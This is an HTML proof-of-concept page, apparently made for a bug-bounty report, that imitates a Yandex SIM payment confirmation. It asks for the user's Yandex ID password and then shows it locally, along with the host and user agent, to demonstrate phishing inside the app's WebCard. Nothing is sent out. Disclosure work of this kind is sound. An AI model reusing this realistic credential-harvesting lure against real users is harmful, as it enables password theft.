<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<title>Демо F1</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; }
  body { background: #f2f3f5; padding: 16px; }
  .poc-banner { background: #d0021b; color: #fff; text-align: center; padding: 6px; font-size: 12px; font-weight: 700; letter-spacing: .5px; border-radius: 8px 8px 0 0; }
  .card { background: #fff; border-radius: 0 0 12px 12px; padding: 20px 16px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
  .logo-row { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
  .logo { width: 36px; height: 36px; border-radius: 10px; background: #fc3f1d; color: #fff; font-weight: 900; font-size: 22px; display: flex; align-items: center; justify-content: center; }
  .logo-row b { font-size: 17px; }
  h1 { font-size: 17px; margin: 4px 0 10px; }
  p.desc { font-size: 14px; color: #5d5f63; margin-bottom: 14px; line-height: 1.35; }
  .sum { background: #f5f0ff; border: 1px solid #e6ddff; border-radius: 10px; padding: 12px; margin-bottom: 14px; }
  .sum .row { display: flex; justify-content: space-between; font-size: 14px; padding: 3px 0; }
  .sum .row b { font-size: 16px; }
  label { font-size: 12px; color: #8c8e92; display: block; margin-bottom: 6px; }
  input { width: 100%; border: 1px solid #d9dadc; border-radius: 10px; padding: 13px 12px; font-size: 16px; margin-bottom: 14px; background: #fff; }
  button { width: 100%; background: #16a057; border: 0; border-radius: 12px; color: #fff; font-size: 16px; font-weight: 700; padding: 14px; }
  .result { margin-top: 14px; background: #1a1a1a; color: #7CFC00; font-family: monospace; font-size: 12px; border-radius: 10px; padding: 12px; word-break: break-all; display: none; }
</style>
</head>
<body>
<div class="poc-banner">POC · БАГ-БАУНТИ ДЕМО · СТРАНИЦА ИССЛЕДОВАТЕЛЯ</div>
<div class="card">
  <div class="logo-row"><div class="logo">С</div><b>Яндекс Сим</b></div>
  <h1>Подтверждение оплаты</h1>
  <p class="desc">Тариф «Умный Сим» — списание 990 ₽. Для подтверждения введите пароль от аккаунта Яндекс ID.</p>
  <div class="sum">
    <div class="row"><span>Тариф</span><span>Умный Сим</span></div>
    <div class="row"><span>Списание</span><b>990 ₽</b></div>
    <div class="row"><span>Дата</span><span id="d"></span></div>
  </div>
  <label>Пароль от Яндекс ID</label>
  <input type="password" id="pw" placeholder="Введите пароль" autocomplete="off">
  <button onclick="go()">Подтвердить оплату</button>
  <div class="result" id="res"></div>
</div>
<script>
  document.getElementById('d').textContent = new Date().toLocaleDateString('ru-RU');
  function go() {
    var pw = document.getElementById('pw').value;
    var r = document.getElementById('res');
    r.style.display = 'block';
    r.textContent = '[АТАКОВЩИК ПОЛУЧИЛ ДАННЫЕ]\nпароль: ' + (pw || '(пусто)') +
      '\n\nСтраница открыта внутри приложения «Яндекс Сим» (passport WebCard), host: ' + location.host +
      '\nUA: ' + navigator.userAgent.slice(0, 80);
  }
</script>
</body>
</html>
